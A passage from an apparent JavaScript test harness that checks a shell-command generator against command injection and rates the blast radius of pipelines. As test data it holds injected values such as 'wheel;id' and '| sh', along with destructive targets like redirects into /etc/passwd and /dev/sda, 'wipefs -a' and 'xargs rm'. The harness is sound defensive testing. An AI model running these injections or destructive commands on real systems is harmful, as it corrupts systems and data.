    ["group_list", "wheel", true], ["group_list", "wheel,docker", true],
    ["group_list", "_svc,wheel,docker", true],
    ["group_list", "wheel docker", false], ["group_list", "wheel,,docker", false],
    ["group_list", "Wheel", false], ["group_list", "wheel;id", false],
    ["group_list", "wheel,", false], ["group_list", "-wheel", false]
  ];
  for (var gc = 0; gc < grammarCases.length; gc++) {
    grammarChecks++;
    var gcType = grammarCases[gc][0];
    if (!A.FIELD_TYPES[gcType]) {
      stats.failures.push("field grammar: there is no '" + gcType + "' field type. MCR-SEC-016 " +
                          "requires a closed grammar where the field has one, and `comment` — the " +
                          "one free-text type in the product — is not it");
      continue;
    }
    var gcRes = A.validateField(gcType, grammarCases[gc][1], { name: "v", type: gcType });
    if (gcRes.ok !== grammarCases[gc][2]) {
      stats.failures.push("field grammar: " + gcType + " " + JSON.stringify(grammarCases[gc][1]) +
                          " was " + (gcRes.ok ? "accepted" : "refused (" + gcRes.reason + ")") +
                          ", expected " + (grammarCases[gc][2] ? "accepted" : "refused"));
    }
  }
  /* MCR-SEC-016 reproduction, verbatim from the D4 review, kept as a named
     regression: the real generator, the real field, the value Marcus typed. */
  for (var grv = 0; grv < VERSIONS.length; grv++) {
    grammarChecks++;
    var lvSpec = null;
    for (var lvi = 0; lvi < specEntries.length; lvi++) {
      if (specEntries[lvi].id === "gen-lvextend-grow") lvSpec = specEntries[lvi];
    }
    if (lvSpec === null) {
      stats.failures.push("MCR-SEC-016 regression: gen-lvextend-grow is not in content/commands.json");
      break;
    }
    var lvBad = A.assembleCommand(lvSpec, VERSIONS[grv],
                                  { size: "ticket RFC-1234", resizefs: "yes",
                                    lvpath: "/dev/vg0/lv0" }, { patterns: [] });
    if (lvBad !== null) {
      stats.failures.push("MCR-SEC-016 regression / RHEL " + VERSIONS[grv] + ": a nonsense LVM size " +
                          "assembled into a complete command — " + JSON.stringify(lvBad.command));
    }
    grammarChecks++;
    var lvGood = A.assembleCommand(lvSpec, VERSIONS[grv],
                                   { size: "+10G", resizefs: "yes", lvpath: "/dev/vg0/lv0" },
                                   { patterns: [] });
    if (lvGood === null) {
      stats.failures.push("MCR-SEC-016 control / RHEL " + VERSIONS[grv] + ": the '+10G' grow form " +
                          "was refused — check the healthy case before believing the signal");
    }
  }

  /* ---- the DERIVED join rule, token by token (MCR-SEC-015 / E1) ----------
     The golden table proves the 24 shipped generators. This proves the RULE,
     on token shapes no generator writes today, so the twenty-first generator
     inherits it: the join is computed from the flag's shape, the two escape
     hatches are legal only on the shape they belong to, and a token that
     declares a join its shape derives is a disagreement — null, never a guess.
     extract/schema.py refuses each of these at build time; this is the run-time
     backstop, and the two halves have to agree. */
  var joinChecks = 0;
  function joinSpec(tok) {
    return { id: "harness-join", tool: "harness", blast: "green",
             fields: [{ name: "v", type: "integer", required: true, versions: VERSIONS }],
             template: [{ lit: "probe" }, tok] };
  }
  var joinCases = [
    [{ flag: "-M", field: "v" }, "probe -M '42'", "a short option derives a SPACE join"],
    [{ flag: "-M", field: "v", join: "glued" }, "probe -M'42'", "join:\"glued\" emits -Xvalue"],
    [{ flag: "--value", field: "v" }, "probe --value='42'", "a long option derives an '=' join"],
    [{ flag: "--value", field: "v", eq: false }, "probe --value '42'", "eq:false spaces a long option"],
    [{ flag: "-M", field: "v", eq: false }, null,
     "a SHORT option may not declare eq — the join is derived, and eq:false here is an author " +
     "asserting a rule the shape already states"],
    [{ flag: "-M", field: "v", eq: true }, null,
     "a SHORT option may not declare eq:true — that is the MCR-SEC-015 defect, spelled out"],
    [{ flag: "--value", field: "v", join: "glued" }, null,
     "a LONG option may not declare join"],
    [{ flag: "-M", field: "v", join: "spaced" }, null, "\"glued\" is the only declared join"]
  ];
  for (var jc = 0; jc < joinCases.length; jc++) {
    for (var jv = 0; jv < VERSIONS.length; jv++) {
      joinChecks++;
      var jres = A.assembleCommand(joinSpec(joinCases[jc][0]), VERSIONS[jv], { v: "42" },
                                   { patterns: [] });
      var jgot = jres === null ? null : jres.command;
      if (jgot !== joinCases[jc][1]) {
        stats.failures.push("join rule / RHEL " + VERSIONS[jv] + " / " +
                            JSON.stringify(joinCases[jc][0]) + ": expected " +
                            JSON.stringify(joinCases[jc][1]) + ", got " + JSON.stringify(jgot) +
                            " — " + joinCases[jc][2]);
      }
    }
  }


  /* ---- CR-T-31: the PIPELINE ORACLE ------------------------------------
   * Everything above proves one command. A pipeline adds the one thing this
   * product exists to refuse: a shell OPERATOR in the emitted string. The
   * design constraint is that an operator is structure the tool owns and never
   * a value the user supplies, so the oracle's job is to prove exactly that
   * sentence about the emitted text.
   *
   * THE ORACLE, in three sentences.
   * (1) It builds the expected WORD LAYOUT of the pipeline from the user's own
   *     composition -- the operator keys they picked, expanded through the
   *     closed table, and each command stage's word count taken from
   *     assembleCommand(), the single-command path already proved by the
   *     80,525-check sweep above and by the golden table -- so the expectation
   *     is derived from the user's intent and from independently-proved code,
   *     never from assemblePipeline()'s own output.
   * (2) It then tokenises the emitted pipeline under POSIX single-quote rules
   *     and asserts that the word at every expected operator INDEX is that
   *     exact operator, fully unquoted, and that no OTHER word in the line is
   *     an operator token or carries a shell metacharacter in its unquoted
   *     part -- so an operator the user did not compose, an operator absorbed
   *     into a value, and a value that broke out of its quotes are three
   *     different failures and all three are caught.
   * (3) Because the expected count is exact, a stage that contributed the
   *     wrong number of words fails before any position is compared, which is
   *     what stops a "clever" injection from paying for an extra operator by
   *     deleting a word somewhere else.
   *
   * The negative controls below hand it pipelines that are wrong in each of
   * those ways and FAIL if it reports agreement.
   */
  var SHELL_OP_WORDS = ["|", "&&", "||", ";", ">", ">>", "2>", "2>&1"];

  /* The expected word layout, computed from the COMPOSITION, not the output. */
  function pipelineLayout(stages, version) {
    var words = 0, ops = [], i, j;
    for (i = 0; i < stages.length; i++) {
      var st = stages[i];
      var kind = st.kind || "command";
      if (i > 0) {
        if (!Object.prototype.hasOwnProperty.call(A.PIPE_OPERATORS, st.op)) return null;
        var op = A.PIPE_OPERATORS[st.op];
        var emitted = op.emit.split(" ");
        for (j = 0; j < emitted.length; j++) {
          if (SHELL_OP_WORDS.indexOf(emitted[j]) >= 0) ops.push({ at: words, text: emitted[j] });
          words++;
        }
        if (op.takes === "path") { words++; continue; }     /* the quoted target */
        if (op.takes === "none") continue;
      }
      var child = A.assembleCommand(st.spec, version, st.values || {}, { patterns: [] });
      if (child === null) return null;
      var cw = tokenize(child.command);
      if (cw === null) return null;
      if (kind === "xargs") {
        var x = st.xargs || {};
        words += 1;                                          /* xargs */
        if (x.nul === true) words += 1;                      /* -0 */
        if (x.maxArgs !== undefined && x.maxArgs !== null && x.maxArgs !== "") words += 2;   /* -n N */
        if (x.replace === true) words += 2;                  /* -I '{}' */
        words += cw.length;
        if (x.replace === true) words += 1;                  /* the trailing '{}' */
      } else {
        words += cw.length;
      }
    }
    return { count: words, ops: ops };
  }

  function pipelineOracle(command, stages, version) {
    var want = pipelineLayout(stages, version);
    if (want === null) {
      return "the oracle cannot state an expectation for this composition, yet a pipeline was " +
             "emitted -- assemblePipeline() accepted something assembleCommand() and the closed " +
             "operator table between them cannot account for";
    }
    var got = tokenize(command);
    if (got === null) return "the emitted pipeline does not tokenise as balanced shell words";
    if (got.length !== want.count) {
      return "the pipeline is " + got.length + " words, the operator's composition is " +
             want.count + " -- " + JSON.stringify(command);
    }
    var expectedAt = {}, i;
    for (i = 0; i < want.ops.length; i++) {
      var at = want.ops[i].at, w = got[at];
      expectedAt[at] = true;
      if (w.quoted) {
        return "operator " + i + " should be " + JSON.stringify(want.ops[i].text) + " at word " +
               at + ", but that word is QUOTED -- an operator that is part of a value is not an " +
               "operator: " + JSON.stringify(command);
      }
      if (w.raw !== want.ops[i].text) {
        return "operator " + i + " at word " + at + " is " + JSON.stringify(w.raw) +
               ", the operator composed " + JSON.stringify(want.ops[i].text) + " -- " +
               JSON.stringify(command);
      }
    }
    for (i = 0; i < got.length; i++) {
      if (expectedAt[i]) continue;
      if (SHELL_OP_WORDS.indexOf(got[i].raw) >= 0) {
        return "word " + i + " is the operator " + JSON.stringify(got[i].raw) + ", which the " +
               "operator never composed -- an operator reached the command from somewhere other " +
               "than the closed table: " + JSON.stringify(command);
      }
      if (!UNQUOTED_OK.test(got[i].bare)) {
        return "word " + i + " leaves " + JSON.stringify(got[i].bare) + " outside every quote -- " +
               "a shell metacharacter in a pipeline is an operator by another name: " +
               JSON.stringify(command);
      }
    }
    return null;
  }

  /* ---- the pipeline sweeps ---------------------------------------------- */
  var pipeChecks = 0, pipeOracles = 0, pipeNegatives = 0, oneStageInvariants = 0;
  var pipeRejected = 0, pipeComposed = 0;

  function benignValuesFor(type, def) { return { v: def.benign }; }

  /* One pipeline composition, with the same two-outcome rule the single-command
     sweep uses: REJECTED (null) or COMPOSED-AND-CONTAINED (the value is inside a
     single-quoted token, the shape matches the benign control, and the pipeline
     oracle agrees with the operator's composition, word for word). */
  function pcheck(label, cls, stages, version, hostileValue, expect, benignStages) {
    pipeChecks++; stats.checks++;
    var res;
    try {
      res = A.assemblePipeline(stages, version, { patterns: [] });
    } catch (e) {
      stats.failures.push("pipeline " + label + ": assemblePipeline threw " + e.message);
      return;
    }
    if (res === null) {
      if (expect !== "reject") {
        stats.failures.push("pipeline " + label + ": refused a composition that is legitimate for " +
                            "these field types -- a composer that refuses everything proves nothing");
        return;
      }
      pipeRejected++; stats.rejected++; note(cls, "rejected");
      return;
    }
    if (expect === "reject") {
      stats.failures.push("pipeline " + label + ": composed " + JSON.stringify(res.command) +
                          " from a value its field type's allow-list must refuse");
      return;
    }
    var words = tokenize(res.command);
    if (words === null) {
      stats.failures.push("pipeline " + label + ": does not tokenise as balanced shell words -- " +
                          JSON.stringify(res.command));
      return;
    }
    var bare = bareText(words);
    /* the operators the user composed ARE bare text, so the metacharacter rule
       is asked of the oracle (word by word, operator positions excluded) rather
       than of the whole line here. What IS asked here is the rule that has
       nothing to do with operators: the VALUE never reaches unquoted text. */
    if (hostileValue !== "" && bare.indexOf(hostileValue) >= 0) {
      stats.failures.push("pipeline " + label + ": the value itself reached unquoted text in " +
                          JSON.stringify(res.command));
      return;
    }
    if (benignStages) {
      var ref = A.assemblePipeline(benignStages, version, { patterns: [] });
      if (ref === null) {
        stats.failures.push("pipeline " + label + ": the benign control composition was itself refused");
        return;
      }
      var refWords = tokenize(ref.command);
      if (refWords === null || skeleton(words) !== skeleton(refWords)) {
        stats.failures.push("pipeline " + label + ": shell-visible shape differs from the benign " +
                            "control -- " + JSON.stringify(skeleton(words)) + " vs " +
                            JSON.stringify(refWords ? skeleton(refWords) : "(control does not tokenise)"));
        return;
      }
    }
    var msg = pipelineOracle(res.command, stages, version);
    if (msg) {
      stats.failures.push("pipeline " + label + ": PIPELINE ORACLE -- " + msg);
      return;
    }
    pipeOracles++;
    pipeComposed++; stats.quoted++; note(cls, "quoted");
  }

  /* (1) every hostile vector into every field of every stage of a multi-stage
         pipeline. Three shapes, so the hostile value is driven at the head, at
         the tail and in the middle of a three-stage composition -- a position
         rule that only held at one end would show up here. */
  var PIPE_SHAPES = ["head", "tail", "middle"];
  function pipeStagesFor(shape, type, def, hostile) {
    var H = { v: hostile }, B = benignValuesFor(type, def);
    if (shape === "head") {
      return [{ spec: flagSpec(type, def), values: H },
              { op: "pipe", spec: argSpec(type, def), values: B }];
    }
    if (shape === "tail") {
      return [{ spec: flagSpec(type, def), values: B },
              { op: "pipe", spec: argSpec(type, def), values: H }];
    }
    return [{ spec: flagSpec(type, def), values: B },
            { op: "pipe", spec: argSpec(type, def), values: H },
            { op: "seq", spec: spacedFlagSpec(type, def), values: B }];
  }
  for (var pt2 = 0; pt2 < types.length; pt2++) {
    var ptype = types[pt2];
    var pdef2 = fx.field_types[ptype];
    for (var pv2 = 0; pv2 < vectors.length; pv2++) {
      var pvec = vectors[pv2];
      for (var pr2 = 0; pr2 < VERSIONS.length; pr2++) {
        for (var psh = 0; psh < PIPE_SHAPES.length; psh++) {
          pcheck(PIPE_SHAPES[psh] + "[" + ptype + "] / " + pvec.id + " / RHEL " + VERSIONS[pr2],
                 pvec["class"],
                 pipeStagesFor(PIPE_SHAPES[psh], ptype, pdef2, pvec.value),
                 VERSIONS[pr2], pvec.value,
                 ptype === "comment" ? pvec.free_text : "reject",
                 pipeStagesFor(PIPE_SHAPES[psh], ptype, pdef2, pdef2.benign));
        }
      }
    }
  }

  /* (2) every hostile vector into a redirect TARGET. The target is the stage
         that carries the least structure -- an operator and a filename -- and
         it is a validated `path` FIELD, never free text, enforced at assembly.
         A vector that happens to be a legal absolute path composes and is
         checked like any other value; everything else is refused. */
  var pathDef = fx.field_types.path;
  for (var rv2 = 0; rv2 < vectors.length; rv2++) {
    for (var rr2 = 0; rr2 < VERSIONS.length; rr2++) {
      var rvec = vectors[rv2];
      var expectTarget = A.validateField("path", rvec.value, null).ok ? "accept" : "reject";
      pcheck("redirect-target / " + rvec.id + " / RHEL " + VERSIONS[rr2], rvec["class"],
             [{ spec: flagSpec("path", pathDef), values: { v: pathDef.benign } },
              { op: "redirect", target: rvec.value }],
             VERSIONS[rr2], rvec.value, expectTarget,
             [{ spec: flagSpec("path", pathDef), values: { v: pathDef.benign } },
              { op: "redirect", target: pathDef.benign }]);
    }
  }

  /* (3) THE SEAM. Every hostile vector, and every prototype-chain key, driven
         into `op` itself -- the one field of a stage whose value selects
         structure. Every one must be null: an operator is a KEY into a closed
         table, and a key that is not an own property of that table is not an
         operator no matter what it spells. */
  var opSeamChecks = 0;
  var opSeamValues = [];
  for (var ov2 = 0; ov2 < vectors.length; ov2++) opSeamValues.push(vectors[ov2].value);
  /* the prototype chain, which hasOwnProperty is the reason this file uses */
  opSeamValues = opSeamValues.concat(["__proto__", "constructor", "toString", "valueOf",
                                      "hasOwnProperty", "prototype", "isPrototypeOf",
                                      "propertyIsEnumerable", "toLocaleString"]);
  /* and the operator text itself, which is the whole point: the emission is
     NOT the key, so typing the operator selects nothing */
  opSeamValues = opSeamValues.concat(["|", "&&", "||", ";", ">", ">>", "2>", "2>&1",
                                      "| tee", "| sh", "|sh", " pipe", "pipe ", "PIPE",
                                      "Pipe", "pipe|sh", "0", "1", "true"]);
  var seamBase = flagSpec("zone", fx.field_types.zone);
  for (var os2 = 0; os2 < opSeamValues.length; os2++) {
    for (var or2 = 0; or2 < VERSIONS.length; or2++) {
      opSeamChecks++;
      pipeChecks++; stats.checks++;
      var seamRes = A.assemblePipeline(
        [{ spec: seamBase, values: { v: "public" } },
         { op: opSeamValues[os2], spec: argSpec("zone", fx.field_types.zone), values: { v: "public" } }],
        VERSIONS[or2], { patterns: [] });
      if (seamRes !== null) {
        stats.failures.push("pipeline operator seam / RHEL " + VERSIONS[or2] + ": op=" +
                            JSON.stringify(opSeamValues[os2]) + " composed " +
                            JSON.stringify(seamRes.command) + " -- an operator came from DATA. " +
                            "The closed table is the only source of an operator word");
      } else {
        pipeRejected++; stats.rejected++; note("pipeline operator seam", "rejected");
      }
    }
  }
  /* control: the ten real keys DO compose, so the seam sweep above is not
     passing because the composer refuses every op it is ever handed. */
  var opKeyControls = 0;
  for (var ok2 = 0; ok2 < A.PIPE_OPERATOR_KEYS.length; ok2++) {
    var okey = A.PIPE_OPERATOR_KEYS[ok2];
    var okOp = A.PIPE_OPERATORS[okey];
    for (var okr = 0; okr < VERSIONS.length; okr++) {
      opKeyControls++;
      pipeChecks++; stats.checks++;
      var okStage = { op: okey };
      if (okOp.takes === "stage") { okStage.spec = argSpec("zone", fx.field_types.zone); okStage.values = { v: "public" }; }
      if (okOp.takes === "path") { okStage.target = "/tmp/mcr-out.txt"; }
      var okStages = [{ spec: seamBase, values: { v: "public" } }, okStage];
      var okRes = A.assemblePipeline(okStages, VERSIONS[okr], { patterns: [] });
      if (okRes === null) {
        stats.failures.push("pipeline operator control / RHEL " + VERSIONS[okr] + ": the closed-set " +
                            "key " + JSON.stringify(okey) + " did not compose -- the seam sweep " +
                            "above would pass on a composer that refuses everything");
        continue;
      }
      if (okRes.command.indexOf(okOp.emit) < 0) {
        stats.failures.push("pipeline operator control / RHEL " + VERSIONS[okr] + ": key " +
                            JSON.stringify(okey) + " did not emit " + JSON.stringify(okOp.emit) +
                            " -- " + JSON.stringify(okRes.command));
        continue;
      }
      var okMsg = pipelineOracle(okRes.command, okStages, VERSIONS[okr]);
      if (okMsg) {
        stats.failures.push("pipeline operator control / " + okey + " / RHEL " + VERSIONS[okr] +
                            ": PIPELINE ORACLE -- " + okMsg);
        continue;
      }
      pipeOracles++; pipeComposed++; stats.quoted++; note("pipeline operator control", "quoted");
    }
  }

  /* (4) the closed table's own integrity: the picker list and the table are the
         same set, every emission is on the closed emission list, and the set is
         the ten operators the product documents. A table that grew a row
         nobody documented is a wider product than the one that was reviewed. */
  var tableChecks = 0;
  (function () {
    var tableKeys = Object.keys(A.PIPE_OPERATORS).sort();
    var pickerKeys = A.PIPE_OPERATOR_KEYS.slice().sort();
    tableChecks++;
    if (tableKeys.join(",") !== pickerKeys.join(",")) {
      stats.failures.push("pipeline operator table: PIPE_OPERATOR_KEYS is [" + pickerKeys.join(", ") +
                          "] but the table's own keys are [" + tableKeys.join(", ") + "] -- a key in " +
                          "one and not the other is either an operator nobody can pick or a picker " +
                          "for an operator that does not exist");
    }
    tableChecks++;
    if (tableKeys.length !== 10) {
      stats.failures.push("pipeline operator table: " + tableKeys.length + " operators, the " +
                          "documented closed set is 10 (| && || ; > >> 2> 2>&1 | tee, | tee -a)");
    }
    for (var tk = 0; tk < tableKeys.length; tk++) {
      tableChecks++;
      var temit = A.PIPE_OPERATORS[tableKeys[tk]].emit;
      if (A.PIPE_OPERATOR_EMITS.indexOf(temit) < 0) {
        stats.failures.push("pipeline operator table: " + tableKeys[tk] + " emits " +
                            JSON.stringify(temit) + ", which is not on the closed emission list");
      }
    }
  })();

  /* (5) THE ONE-STAGE INVARIANT, on every REAL generator and every release.
         A pipeline of one stage is assembleCommand(), byte for byte -- command,
         blast and the inspector's flag list alike. Where assembleCommand()
         returns null the pipeline must be null too: a composer that succeeds
         where the assembler refused is a second, weaker assembler. */
  for (var osg = 0; osg < specEntries.length; osg++) {
    var osEntry = specEntries[osg];
    var osRow = goldenRows[osEntry.id];
    if (!osRow) continue;                        /* already reported by the golden sweep */
    for (var osv = 0; osv < VERSIONS.length; osv++) {
      oneStageInvariants++;
      var osVer = VERSIONS[osv];
      var direct = A.assembleCommand(osEntry, osVer, osRow.values || {}, { patterns: realPatterns });
      var piped = A.assemblePipeline([{ spec: osEntry, values: osRow.values || {} }], osVer,
                                     { patterns: realPatterns });
      if (direct === null) {
        if (piped !== null) {
          stats.failures.push("one-stage invariant " + osEntry.id + " / RHEL " + osVer +
                              ": assembleCommand() refused but assemblePipeline() produced " +
                              JSON.stringify(piped.command) + " -- the composer must never be the " +
                              "weaker of the two");
        }
        continue;
      }
      if (piped === null) {
        stats.failures.push("one-stage invariant " + osEntry.id + " / RHEL " + osVer +
                            ": assembleCommand() produced " + JSON.stringify(direct.command) +
                            " and assemblePipeline() refused it");
        continue;
      }
      if (piped.command !== direct.command) {
        stats.failures.push("one-stage invariant " + osEntry.id + " / RHEL " + osVer + ": " +
                            JSON.stringify(piped.command) + " != " + JSON.stringify(direct.command) +
                            " -- a pipeline of one stage must be the command, byte for byte");
        continue;
      }
      if (piped.blast !== direct.blast) {
        stats.failures.push("one-stage invariant " + osEntry.id + " / RHEL " + osVer +
                            ": blast is '" + piped.blast + "' piped and '" + direct.blast +
                            "' direct -- composition may only ever RAISE, and there is nothing " +
                            "composed here to raise it");
        continue;
      }
      var dflags = [], pflags = [], fi2;
      for (fi2 = 0; fi2 < direct.flags.length; fi2++) dflags.push(direct.flags[fi2].flag);
      for (fi2 = 0; fi2 < piped.flags.length; fi2++) pflags.push(piped.flags[fi2].flag);
      if (dflags.join(" ") !== pflags.join(" ")) {
        stats.failures.push("one-stage invariant " + osEntry.id + " / RHEL " + osVer +
                            ": the inspector's flag list is [" + pflags.join(", ") + "] piped and [" +
                            dflags.join(", ") + "] direct (MCR-SEC-023)");
        continue;
      }
      var osMsg = pipelineOracle(piped.command, [{ spec: osEntry, values: osRow.values || {} }], osVer);
      if (osMsg) {
        stats.failures.push("one-stage invariant " + osEntry.id + " / RHEL " + osVer +
                            ": PIPELINE ORACLE -- " + osMsg);
        continue;
      }
      pipeOracles++;
    }
  }

  /* (6) BLAST COMPOSITION. Blast radius is NOT the max of the stages: a
         redirect target and an xargs child change the rating of a pipeline
         whose stages are individually harmless. One case per rule, on every
         release, with the control that proves the rule is not firing on
         everything. */
  var GREEN_SPEC = { id: "pipe-green", tool: "grep", blast: "green",
                     fields: [{ name: "p", type: "path", required: true, versions: VERSIONS }],
                     template: [{ lit: "grep" }, { lit: "-r" }, { field: "p" }] };
  var FIND_NUL = { id: "pipe-find0", tool: "find", blast: "green",
                   fields: [{ name: "p", type: "path", required: true, versions: VERSIONS }],
                   template: [{ lit: "find" }, { field: "p" }, { lit: "-print0" }] };
  var FIND_PLAIN = { id: "pipe-find", tool: "find", blast: "green",
                     fields: [{ name: "p", type: "path", required: true, versions: VERSIONS }],
                     template: [{ lit: "find" }, { field: "p" }] };
  var RM_SPEC = { id: "pipe-rm", tool: "rm", blast: "yellow", fields: [],
                  template: [{ lit: "rm" }, { lit: "-f" }] };
  var KILL_SPEC = { id: "pipe-kill", tool: "kill", blast: "yellow", fields: [],
                    template: [{ lit: "kill" }, { lit: "-TERM" }] };
  var WC_SPEC = { id: "pipe-wc", tool: "wc", blast: "green", fields: [],
                  template: [{ lit: "wc" }, { lit: "-l" }] };
  var RED_SPEC = { id: "pipe-red", tool: "wipefs", blast: "red", fields: [],
                   template: [{ lit: "wipefs" }, { lit: "-a" }] };
  var YELLOW_SPEC = { id: "pipe-yellow", tool: "systemctl", blast: "yellow", fields: [],
                      template: [{ lit: "systemctl" }, { lit: "restart" }] };
  var SH_SPEC = { id: "pipe-sh", tool: "sh", blast: "green", fields: [],
                  template: [{ lit: "sh" }] };
  var BASH_SPEC = { id: "pipe-bash", tool: "bash", blast: "green", fields: [],
                    template: [{ lit: "bash" }, { lit: "-s" }] };
  var PY_SPEC = { id: "pipe-py", tool: "python3", blast: "green", fields: [],
                  template: [{ lit: "python3" }] };
  var PERL_SPEC = { id: "pipe-perl", tool: "perl", blast: "green", fields: [],
                    template: [{ lit: "perl" }] };
  var HEAD = { spec: GREEN_SPEC, values: { p: "/etc/ssh" } };

  var blastChecks = 0;
  /* PL5: a structural blast row must be ASSERTED TO FIRE, the discipline that
     caught MCR-SEC-008 (a pattern table full of rows that could never match
     across a quote boundary). `raises` says this row's rating must be STRICTLY
     ABOVE the max of its own stages' ratings -- otherwise the row proves only
     that the composer agrees with the stages, which every row does, including
     the ones that do nothing. Each rule id is then asserted to have been
     observed firing at least once, so deleting a rule's implementation fails
     this gate rather than silently passing it. */
  var RANK2 = { green: 0, yellow: 1, red: 2 };
  function maxStageBlastRank(stages, version) {
    var m = 0;
    for (var i = 0; i < stages.length; i++) {
      var st = stages[i];
      if (!st.spec) continue;
      var c = A.assembleCommand(st.spec, version, st.values || {}, { patterns: realPatterns });
      if (c && RANK2[c.blast] > m) m = RANK2[c.blast];
    }
    return m;
  }
  var blastRuleFired = {};
  var blastCases = [
    ["a `>` into a scratch path stays the max of the stages (control)",
     [HEAD, { op: "redirect", target: "/tmp/mcr-out.txt" }], "green", "R-MAX", false],
    ["a `>` OUTSIDE scratch is a WRITE and is at least yellow",
     [HEAD, { op: "redirect", target: "/srv/shares/out.txt" }], "yellow", "R-WRITE", true],
    ["a `>>` outside scratch is a WRITE and is at least yellow",
     [HEAD, { op: "append", target: "/srv/shares/out.txt" }], "yellow", "R-WRITE", true],
    ["a `2>` outside scratch is a WRITE and is at least yellow",
     [HEAD, { op: "redirect_err", target: "/srv/shares/err.txt" }], "yellow", "R-WRITE", true],
    ["a `| tee` outside scratch is a WRITE and is at least yellow",
     [HEAD, { op: "tee", target: "/srv/shares/out.txt" }], "yellow", "R-WRITE", true],
    ["a `| tee -a` outside scratch is a WRITE and is at least yellow",
     [HEAD, { op: "tee_append", target: "/srv/shares/out.txt" }], "yellow", "R-WRITE", true],
    ["a redirect into /etc is RED",
     [HEAD, { op: "redirect", target: "/etc/passwd" }], "red", "R-SYSTEM", true],
    ["a redirect into /boot is RED",
     [HEAD, { op: "redirect", target: "/boot/grub2/grub.cfg" }], "red", "R-SYSTEM", true],
    ["a redirect into /dev is RED",
     [HEAD, { op: "redirect", target: "/dev/sda" }], "red", "R-SYSTEM", true],
    ["a redirect into /usr is RED",
     [HEAD, { op: "append", target: "/usr/share/applications/x.desktop" }], "red", "R-SYSTEM", true],
    ["a redirect into /var/lib is RED",
     [HEAD, { op: "redirect", target: "/var/lib/rpm/Packages" }], "red", "R-SYSTEM", true],
    ["a `| tee` into /etc is RED",
     [HEAD, { op: "tee", target: "/etc/motd" }], "red", "R-SYSTEM", true],
    ["`;` carries the MAX of its stages, not the first",
     [HEAD, { op: "seq", spec: YELLOW_SPEC, values: {} }], "yellow", "R-MAX", false],
    ["`&&` carries the MAX of its stages, not the first",
     [HEAD, { op: "and", spec: YELLOW_SPEC, values: {} }], "yellow", "R-MAX", false],
    ["`||` carries the MAX of its stages, not the first",
     [HEAD, { op: "or", spec: RED_SPEC, values: {} }], "red", "R-MAX", false],
    ["`|` carries the MAX of its stages",
     [HEAD, { op: "pipe", spec: WC_SPEC, values: {} }], "green", "R-MAX", false],
    ["`| xargs rm` is RED even though `rm` alone is yellow",
     [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", spec: RM_SPEC, values: {} }], "red", "R-XARGS", true],
    ["`| xargs kill` is RED even though `kill` alone is yellow",
     [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", spec: KILL_SPEC, values: {} }], "red", "R-XARGS", true],
    ["`| xargs -0 rm` behind find -print0 is RED",
     [{ spec: FIND_NUL, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", xargs: { nul: true }, spec: RM_SPEC, values: {} }], "red",
     "R-XARGS", true],
    ["`| xargs <a red-blast tool>` is RED",
     [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", spec: RED_SPEC, values: {} }], "red", "R-MAX", false],
    ["`| xargs <a green tool>` is NOT raised -- the xargs rule is not firing on everything",
     [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", spec: WC_SPEC, values: {} }], "green", "R-MAX", false],
    ["a green pipeline with no redirect and no xargs stays green (control)",
     [HEAD, { op: "pipe", spec: WC_SPEC, values: {} }, { op: "pipe", spec: WC_SPEC, values: {} }],
     "green", "R-MAX", false]
  ];
  for (var bc2 = 0; bc2 < blastCases.length; bc2++) {
    for (var bv2 = 0; bv2 < VERSIONS.length; bv2++) {
      blastChecks++;
      var bres2 = A.assemblePipeline(blastCases[bc2][1], VERSIONS[bv2], { patterns: realPatterns });
      if (bres2 === null) {
        stats.failures.push("blast composition / RHEL " + VERSIONS[bv2] + " / " + blastCases[bc2][0] +
                            ": the composition was refused, so the rule it demonstrates was never " +
                            "exercised");
        continue;
      }
      if (bres2.blast !== blastCases[bc2][2]) {
        stats.failures.push("blast composition / RHEL " + VERSIONS[bv2] + " / " + blastCases[bc2][0] +
                            ": rated '" + bres2.blast + "', expected '" + blastCases[bc2][2] +
                            "' -- " + JSON.stringify(bres2.command));
        continue;
      }
      /* PL5: the row must be seen RAISING, not merely agreeing with its stages */
      var stageMax = maxStageBlastRank(blastCases[bc2][1], VERSIONS[bv2]);
      var didRaise = RANK2[bres2.blast] > stageMax;
      if (blastCases[bc2][4] === true) {
        if (!didRaise) {
          stats.failures.push("blast composition / RHEL " + VERSIONS[bv2] + " / " + blastCases[bc2][0] +
                              ": rated '" + bres2.blast + "', which is only the MAX OF ITS STAGES. " +
                              "This row exists to prove a composition rule fires; agreeing with the " +
                              "stages proves nothing (PL5)");
          continue;
        }
        blastRuleFired[blastCases[bc2][3]] = true;
      } else if (didRaise) {
        stats.failures.push("blast composition / RHEL " + VERSIONS[bv2] + " / " + blastCases[bc2][0] +
                            ": rated '" + bres2.blast + "', ABOVE the max of its stages. This row " +
                            "is a control: a composition rule that fires on it fires on everything");
      }
    }
  }
  /* PL5, the inventory: every structural rule must have been observed firing */
  var STRUCTURAL_RULES = ["R-WRITE", "R-SYSTEM", "R-XARGS"];
  for (var sr2 = 0; sr2 < STRUCTURAL_RULES.length; sr2++) {
    blastChecks++;
    if (!blastRuleFired[STRUCTURAL_RULES[sr2]]) {
      stats.failures.push("blast composition: the structural rule " + STRUCTURAL_RULES[sr2] +
                          " was never observed raising a pipeline above the max of its stages. A " +
                          "rule nobody proved fires is a rule that does not exist (PL5)");
    }
  }
  /* PL4: a target nobody classified renders `unrated`, never green. The
     PIPELINE is still rated yellow for gating -- unrated can never sit below a
     write -- but the STAGE says what it is. */
  for (var ur2 = 0; ur2 < VERSIONS.length; ur2++) {
    blastChecks++;
    var urStages = [HEAD, { op: "redirect", target: "/srv/shares/out.txt" }];
    var urRes = A.assemblePipeline(urStages, VERSIONS[ur2], { patterns: realPatterns });
    if (urRes === null || urRes.stages.length !== 2) {
      stats.failures.push("unrated target / RHEL " + VERSIONS[ur2] + ": the composition was refused");
      continue;
    }
    if (urRes.stages[1].blast !== "unrated") {
      stats.failures.push("unrated target / RHEL " + VERSIONS[ur2] + ": a write to a path nobody " +
                          "classified renders '" + urRes.stages[1].blast + "'. Green is a HUMAN " +
                          "CLAIM in this product; an unclassified write must say so (PL4)");
    }
    blastChecks++;
    var scStages = [HEAD, { op: "redirect", target: "/tmp/mcr-out.txt" }];
